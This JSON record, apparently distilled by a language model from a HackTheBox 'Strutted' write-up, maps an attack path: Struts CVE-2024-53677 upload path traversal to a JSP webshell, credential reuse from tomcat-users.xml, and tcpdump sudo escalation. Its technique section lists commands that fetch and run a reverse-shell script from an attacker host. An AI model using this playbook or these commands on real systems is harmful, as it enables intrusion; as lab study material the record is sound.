{
  "writeup_id": "Htb_Strutted",
  "scenario_fingerprint": {
    "scenario_name": "apache_struts_file_upload_rce",
    "primary_services": [
      "http",
      "ssh"
    ],
    "port_signature": "22+80",
    "service_combination": "ssh+nginx+tomcat",
    "os_family": "linux",
    "environment_type": "web_application",
    "entry_vector": "struts_file_upload_vulnerability",
    "privilege_path": "webshell_to_user_to_root",
    "attack_complexity": "medium",
    "estimated_time": "60-90 minutes",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "cve_2024_53677_struts_vulnerability",
      "jsessionid_cookie_present",
      "file_upload_functionality",
      "path_traversal_exploitation"
    ],
    "environmental_clues": [
      "nginx_reverse_proxy",
      "tomcat_backend_server",
      "java_web_application",
      "image_sharing_platform",
      "docker_configuration_available"
    ],
    "similar_scenarios": [
      "struts_rce_boxes",
      "java_web_app_exploitation"
    ],
    "unique_aspects": [
      "recent_struts_cve_2024",
      "file_upload_path_traversal",
      "tomcat_config_credential_reuse",
      "tcpdump_privilege_escalation"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "CVE-2024-53677_File_Upload",
        "success_reason": "Apache Struts 6.3.0.1 vulnerable to file upload path traversal via OGNL manipulation",
        "prerequisite_indicators": [
          "struts_application_detected",
          "file_upload_functionality_present",
          "vulnerable_struts_version_6.3.x",
          "fileuploadinterceptor_enabled"
        ],
        "recognition_patterns": [
          "JSESSIONID cookie indicates Java application",
          "multipart/form-data upload endpoints",
          "struts version in pom.xml or dependencies",
          "Upload parameter name requirement (capital U)"
        ],
        "failure_modes": [
          "struts_version_6.4.0_or_higher",
          "file_upload_disabled",
          "strict_file_validation",
          "incorrect_parameter_naming"
        ],
        "environmental_factors": [
          "tomcat_webserver_backend",
          "default_struts_interceptor_configuration",
          "writable_web_directory",
          "java_application_stack"
        ],
        "success_probability": 0.92,
        "typical_timeframe": "10-30 minutes"
      },
      {
        "technique": "Docker_Source_Code_Analysis",
        "success_reason": "Application provided complete source code and configuration via Docker download",
        "prerequisite_indicators": [
          "docker_image_download_available",
          "source_code_accessible",
          "configuration_files_included"
        ],
        "recognition_patterns": [
          "Dockerfile reveals tech stack",
          "pom.xml shows exact dependency versions",
          "tomcat-users.xml contains credentials",
          "application structure visible"
        ],
        "failure_modes": [
          "no_source_code_provided",
          "obfuscated_configurations",
          "minimal_docker_image"
        ],
        "environmental_factors": [
          "developer_friendly_platform",
          "educational_or_demo_environment",
          "insufficient_opsec_practices"
        ],
        "success_probability": 0.95,
        "typical_timeframe": "5-15 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Apache Struts 6.3.0.1 with file upload",
        "discovery_method": "Docker source code analysis and version identification",
        "why_critical": "Exact vulnerable version susceptible to CVE-2024-53677 path traversal",
        "how_to_recognize": [
          "JSESSIONID cookie on initial request",
          "file upload functionality present",
          "pom.xml reveals struts2.version 6.3.0.1",
          "multipart form data handling"
        ],
        "follow_up_actions": [
          "test_cve_2024_53677_exploit",
          "craft_webshell_upload_payload",
          "use_ognl_parameter_manipulation",
          "target_writable_web_directories"
        ]
      },
      {
        "discovery": "Tomcat admin credentials in source",
        "discovery_method": "tomcat-users.xml file analysis",
        "why_critical": "Provides admin access to Tomcat manager if accessible",
        "how_to_recognize": [
          "tomcat-users.xml in docker files",
          "admin username with complex password",
          "manager-gui and admin-gui roles assigned"
        ],
        "follow_up_actions": [
          "test_manager_interface_access",
          "attempt_credential_reuse",
          "check_tomcat_version_vulnerabilities"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "webshell_upload",
        "escalation_method": "OGNL_Parameter_Manipulation",
        "why_possible": "FileUploadInterceptor processes OGNL expressions in POST parameters",
        "recognition_signs": [
          "multipart_form_data_accepted",
          "upload_parameter_name_capital_u",
          "ognl_stack_manipulation_possible",
          "path_traversal_via_uploadfilename"
        ],
        "exploitation_path": "File Upload → OGNL Manipulation → Path Traversal → Webshell → RCE"
      },
      {
        "privilege_level": "tomcat_user",
        "escalation_method": "Credential_Reuse_from_Config",
        "why_possible": "Hardcoded credentials in configuration files often reused",
        "recognition_signs": [
          "tomcat_admin_credentials_found",
          "password_complexity_suggests_reuse",
          "service_account_patterns"
        ],
        "exploitation_path": "Config Analysis → Credential Extraction → SSH/Service Login → User Access"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found ports 22,80 open on Linux host with nginx redirecting to domain",
        "decision": "Enumerate web application and check for known vulnerabilities",
        "reasoning": "Limited attack surface suggests web app is primary entry point",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "subdomain_enumeration",
            "when": "if main site yields no results"
          },
          {
            "option": "directory_brute_force",
            "when": "if no obvious vulnerabilities found"
          }
        ],
        "success_indicators": [
          "application_framework_identified",
          "version_information_discovered",
          "docker_config_available"
        ],
        "next_decision": "analyze_application_stack"
      },
      {
        "step": 2,
        "situation": "Identified Apache Struts 6.3.0.1 with JSESSIONID and Docker config available",
        "decision": "Check for CVE-2024-53677 file upload vulnerability",
        "reasoning": "Version 6.3.0.1 is vulnerable to recent Struts file upload bypass",
        "confidence": 0.95,
        "prerequisites": [
          "struts_version_confirmed",
          "file_upload_functionality_exists"
        ],
        "success_indicators": [
          "file_upload_interceptor_responds",
          "path_traversal_possible"
        ],
        "failure_fallbacks": [
          "source_code_analysis",
          "other_struts_cves",
          "tomcat_manager_access"
        ]
      },
      {
        "step": 3,
        "situation": "CVE-2024-53677 exploitation successful with webshell upload",
        "decision": "Use discovered Tomcat credentials for lateral movement",
        "reasoning": "Docker config revealed tomcat-users.xml with admin credentials",
        "confidence": 0.85,
        "prerequisites": [
          "webshell_access_confirmed",
          "tomcat_credentials_from_config"
        ],
        "success_indicators": [
          "user_account_access",
          "additional_privileges_gained"
        ],
        "failure_fallbacks": [
          "privilege_escalation_enumeration",
          "system_reconnaissance"
        ]
      }
    ],
    "branching_logic": {
      "if_struts_vulnerability_succeeds": {
        "action": "upload_webshell_and_establish_reverse_shell",
        "tools": [
          "burp_repeater",
          "jsp_webshell",
          "nc_listener"
        ],
        "next_phase": "credential_harvesting_from_configs"
      },
      "if_struts_vulnerability_fails": {
        "action": "analyze_source_code_and_try_alternative_attacks",
        "alternatives": [
          "tomcat_manager_brute_force",
          "other_struts_cves",
          "application_logic_flaws"
        ],
        "decision_criteria": "based_on_available_attack_surface"
      },
      "if_tomcat_credentials_found": {
        "action": "attempt_ssh_login_and_privilege_escalation",
        "purpose": "lateral_movement_to_user_account",
        "tools": [
          "ssh",
          "sudo_enumeration",
          "suid_binaries"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "always_check_recent_cves_for_identified_frameworks",
        "reasoning": "new_vulnerabilities_often_have_high_success_rates",
        "applicability": "any_versioned_web_framework"
      },
      {
        "rule": "download_and_analyze_provided_configuration_files",
        "reasoning": "often_contain_credentials_or_reveal_attack_paths",
        "applicability": "when_docker_configs_or_source_available"
      },
      {
        "rule": "exploit_file_upload_with_proper_parameter_names",
        "reasoning": "struts_interceptor_requires_specific_upload_parameter_name",
        "applicability": "apache_struts_file_upload_vulnerabilities"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "CVE-2024-53677 Struts File Upload",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "apache_struts_application",
          "file_upload_functionality",
          "struts_version_6.3.0.1_or_vulnerable",
          "web_application_accessible"
        ],
        "success_indicators": [
          "jsessionid_cookie_present",
          "file_upload_form_available",
          "path_traversal_successful",
          "webshell_upload_successful"
        ],
        "incompatible_with": [
          "struts_patched_version",
          "file_upload_disabled",
          "strict_file_validation",
          "web_application_firewall_blocking"
        ],
        "confidence_boosters": [
          "java_application_detected",
          "tomcat_server_headers",
          "struts_error_messages",
          "maven_build_artifacts"
        ],
        "typical_success_rate": 0.85,
        "estimated_time": "10-30 minutes"
      },
      {
        "technique": "Tomcat Manager Exploitation",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          8080,
          8443,
          80,
          443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "tomcat_server_running",
          "manager_interface_accessible",
          "weak_credentials_or_default_creds",
          "manager_gui_role_enabled"
        ],
        "success_indicators": [
          "manager_login_successful",
          "war_deployment_allowed",
          "application_list_accessible"
        ],
        "incompatible_with": [
          "manager_interface_disabled",
          "strong_authentication",
          "ip_restrictions_enabled",
          "manager_context_removed"
        ],
        "confidence_boosters": [
          "tomcat_default_pages_accessible",
          "tomcat_version_disclosure",
          "common_credential_patterns"
        ],
        "typical_success_rate": 0.65,
        "estimated_time": "5-20 minutes"
      },
      {
        "technique": "Credential Reuse from Config Files",
        "mitre_id": "T1552.001",
        "required_services": [
          "any"
        ],
        "required_ports": [],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "config_files_accessible",
          "credentials_in_plaintext",
          "multiple_user_accounts",
          "ssh_or_remote_access_available"
        ],
        "success_indicators": [
          "config_files_readable",
          "credentials_extracted",
          "credential_reuse_successful"
        ],
        "incompatible_with": [
          "encrypted_credentials",
          "config_files_protected",
          "unique_passwords_per_service"
        ],
        "confidence_boosters": [
          "tomcat_users_xml_found",
          "database_config_files",
          "application_property_files"
        ],
        "typical_success_rate": 0.7,
        "estimated_time": "5-15 minutes"
      },
      {
        "technique": "tcpdump Privilege Escalation",
        "mitre_id": "T1548.001",
        "required_services": [
          "any"
        ],
        "required_ports": [],
        "os_requirements": [
          "linux"
        ],
        "environmental_prerequisites": [
          "tcpdump_with_sudo_privileges",
          "user_in_sudoers_for_tcpdump",
          "network_interface_accessible"
        ],
        "success_indicators": [
          "sudo_tcpdump_executable",
          "postrotate_script_writable",
          "root_shell_obtained"
        ],
        "incompatible_with": [
          "tcpdump_not_installed",
          "no_sudo_privileges",
          "restricted_sudo_configuration"
        ],
        "confidence_boosters": [
          "sudo_l_shows_tcpdump",
          "logrotate_configs_writable",
          "network_monitoring_setup"
        ],
        "typical_success_rate": 0.8,
        "estimated_time": "10-25 minutes"
      }
    ],
    "environmental_detectors": {
      "apache_struts": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "banner_indicators": [
          "JSESSIONID",
          "Struts",
          "Apache Struts"
        ],
        "technology_indicators": [
          "java",
          "tomcat",
          "struts2"
        ],
        "confidence_threshold": 0.8
      },
      "tomcat_server": {
        "port_indicators": [
          8080,
          8443,
          80,
          443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "banner_indicators": [
          "Apache Tomcat",
          "Tomcat",
          "Server: Apache-Coyote"
        ],
        "technology_indicators": [
          "JSESSIONID",
          "java",
          "jsp"
        ],
        "confidence_threshold": 0.85
      },
      "java_application": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "banner_indicators": [
          "JSESSIONID",
          "Java",
          "JVM"
        ],
        "technology_indicators": [
          "jsp",
          "servlet",
          "spring",
          "struts"
        ],
        "confidence_threshold": 0.75
      },
      "linux_system": {
        "port_indicators": [
          22
        ],
        "service_indicators": [
          "ssh"
        ],
        "banner_indicators": [
          "OpenSSH",
          "Ubuntu",
          "Linux"
        ],
        "technology_indicators": [
          "bash",
          "systemd"
        ],
        "confidence_threshold": 0.9
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "cve_2024_53677_struts_upload",
          "when": "struts_application_with_upload_detected",
          "reason": "recent_vulnerability_high_success_rate"
        },
        {
          "attack": "tomcat_manager_bruteforce",
          "when": "tomcat_server_detected",
          "reason": "often_default_or_weak_credentials"
        }
      ],
      "medium_priority": [
        {
          "attack": "credential_reuse_from_configs",
          "when": "config_files_accessible",
          "reason": "common_in_development_environments"
        },
        {
          "attack": "sudo_privilege_escalation",
          "when": "linux_system_with_user_access",
          "reason": "misconfigured_sudo_permissions_common"
        }
      ],
      "low_priority": [
        {
          "attack": "ssh_bruteforce",
          "when": "ssh_service_detected",
          "reason": "time_consuming_low_success_rate"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "Apache Struts File Upload Path Traversal",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "Burp Suite Repeater",
            "command_template": "POST /upload.action with multipart form data",
            "actual_command": "Upload parameter with filename and top.UploadFileName parameter for path traversal",
            "output_pattern": "File uploaded to specified path",
            "effectiveness_rating": 5,
            "reliability": 0.9
          },
          {
            "name": "CVE-2024-53677 POC",
            "command_template": "python CVE-2024-53677.py -u {url} -p {path}",
            "actual_command": "python CVE-2024-53677.py -u http://strutted.htb/upload.action -p 'test.txt'",
            "success_factors": [
              "struts_version_6.3.0.1",
              "file_upload_interceptor_enabled"
            ],
            "effectiveness_rating": 4
          }
        ],
        "prerequisites": [
          "apache_struts_version_2.0.0_to_6.4.0",
          "file_upload_functionality_available",
          "fileuploadinterceptor_enabled"
        ],
        "success_indicators": [
          "file_uploaded_outside_intended_directory",
          "jsp_webshell_accessible_via_http",
          "command_execution_confirmed"
        ],
        "common_failures": [
          "incorrect_parameter_name_case",
          "file_extension_restrictions",
          "insufficient_path_traversal_depth"
        ],
        "follow_up_techniques": [
          "webshell_deployment",
          "reverse_shell_establishment",
          "privilege_escalation"
        ],
        "time_investment": "15-45 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "JSP Webshell Deployment",
        "mitre_id": "T1505.003",
        "category": "persistence",
        "phase": "persistence",
        "tools_used": [
          {
            "name": "JSP Command Shell",
            "command_template": "Embed JSP code in uploaded file",
            "actual_command": "cmd.jsp webshell with command parameter",
            "output_pattern": "Command output displayed in web page",
            "effectiveness_rating": 5,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "file_upload_vulnerability_exploited",
          "jsp_execution_environment_available",
          "web_accessible_upload_location"
        ],
        "success_indicators": [
          "webshell_responds_to_http_requests",
          "command_execution_via_web_interface",
          "system_information_retrievable"
        ],
        "common_failures": [
          "file_processed_as_static_content",
          "jsp_execution_disabled",
          "insufficient_file_permissions"
        ],
        "follow_up_techniques": [
          "reverse_shell_establishment",
          "file_system_enumeration",
          "credential_harvesting"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "Reverse Shell via Staged Payload",
        "mitre_id": "T1059.004",
        "category": "execution",
        "phase": "execution",
        "tools_used": [
          {
            "name": "wget",
            "command_template": "wget http://{attacker_ip}/{payload_file}",
            "actual_command": "wget http://10.10.14.6/shell.sh",
            "output_pattern": "File downloaded successfully",
            "effectiveness_rating": 4,
            "reliability": 0.85
          },
          {
            "name": "bash",
            "command_template": "bash {payload_file}",
            "actual_command": "bash /dev/shm/shell.sh",
            "success_factors": [
              "network_connectivity",
              "bash_available"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "command_execution_capability",
          "outbound_network_connectivity",
          "writable_directory_access"
        ],
        "success_indicators": [
          "payload_downloaded_successfully",
          "reverse_connection_established",
          "interactive_shell_obtained"
        ],
        "common_failures": [
          "network_restrictions",
          "payload_detection_prevention",
          "insufficient_execution_permissions"
        ],
        "follow_up_techniques": [
          "shell_stabilization",
          "privilege_escalation",
          "lateral_movement"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "Burp Suite Repeater",
        "use_case": "manual_exploitation_testing",
        "effectiveness_rating": 5,
        "reliability": 0.98,
        "learning_curve": "medium",
        "essential_for": [
          "web_application_testing"
        ],
        "alternatives": [
          "curl",
          "custom_python_scripts"
        ],
        "best_practices": [
          "clean_up_requests_for_clarity",
          "use_auto_scroll_to_find_responses",
          "test_each_modification_incrementally"
        ]
      },
      {
        "tool": "JSP Webshells",
        "use_case": "persistent_web_access",
        "effectiveness_rating": 5,
        "reliability": 0.9,
        "learning_curve": "low",
        "essential_for": [
          "java_web_applications"
        ],
        "alternatives": [
          "aspx_shells",
          "php_shells"
        ],
        "best_practices": [
          "embed_in_valid_file_formats",
          "use_simple_command_execution_patterns",
          "stage_complex_payloads_externally"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "struts_cve_2024_53677_exploitation",
        "steps": [
          {
            "step": 1,
            "command": "POST with Upload parameter (capital U) and top.UploadFileName",
            "purpose": "Exploit path traversal in file upload",
            "expected_output": "File uploaded to custom location"
          },
          {
            "step": 2,
            "command": "Embed JSP webshell in uploaded file content",
            "purpose": "Establish web-based command execution",
            "expected_output": "Webshell accessible via HTTP"
          },
          {
            "step": 3,
            "command": "wget http://attacker-ip/shell.sh via webshell",
            "purpose": "Download reverse shell payload",
            "expected_output": "Shell script downloaded to target"
          },
          {
            "step": 4,
            "command": "bash /dev/shm/shell.sh via webshell",
            "purpose": "Execute reverse shell",
            "expected_output": "Interactive shell connection established"
          }
        ],
        "success_rate": 0.85,
        "typical_duration": "30-60 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Strutted",
      "difficulty": "Medium",
      "os": "Ubuntu 22.04",
      "platform": "HackTheBox",
      "release_date": "2025-01-23",
      "author": "TheCyberGeek & 7u9y",
      "estimated_time": "60-90 minutes"
    },
    "intelligence_metadata": {
      "attack_complexity": "medium",
      "skill_level_required": "intermediate",
      "primary_attack_vectors": [
        "web_application",
        "cve_exploitation",
        "privilege_escalation"
      ],
      "key_vulnerabilities": [
        "cve-2024-53677",
        "credential_reuse",
        "sudo_misconfiguration"
      ],
      "environment_type": "web_server_linux",
      "real_world_relevance": "very_high",
      "learning_value": [
        "apache_struts_exploitation",
        "webshell_upload",
        "tcpdump_privilege_escalation"
      ],
      "prerequisite_knowledge": [
        "web_application_security",
        "linux_fundamentals",
        "file_upload_attacks"
      ]
    },
    "categorization": {
      "primary_category": "web_application",
      "subcategories": [
        "cve_exploitation",
        "privilege_escalation",
        "credential_access"
      ],
      "attack_types": [
        "initial_access",
        "persistence",
        "privilege_escalation"
      ],
      "defensive_lessons": [
        "patch_management",
        "secure_file_uploads",
        "sudo_hardening",
        "credential_rotation"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Tabby",
        "Jerry",
        "Stratosphere"
      ],
      "similarity_reasons": [
        "apache_struts",
        "tomcat_exploitation",
        "web_application_focus"
      ],
      "unique_aspects": [
        "recent_cve_2024",
        "tcpdump_escalation",
        "systemd_protections"
      ],
      "difficulty_factors": [
        "tricky_exploit",
        "credential_discovery",
        "sudo_abuse"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T18:44:01.605982",
    "original_file": "0xdf_writeups/Htb Strutted.md",
    "content_length": 35256,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 0.9166666666666667,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 0.6666666666666666,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}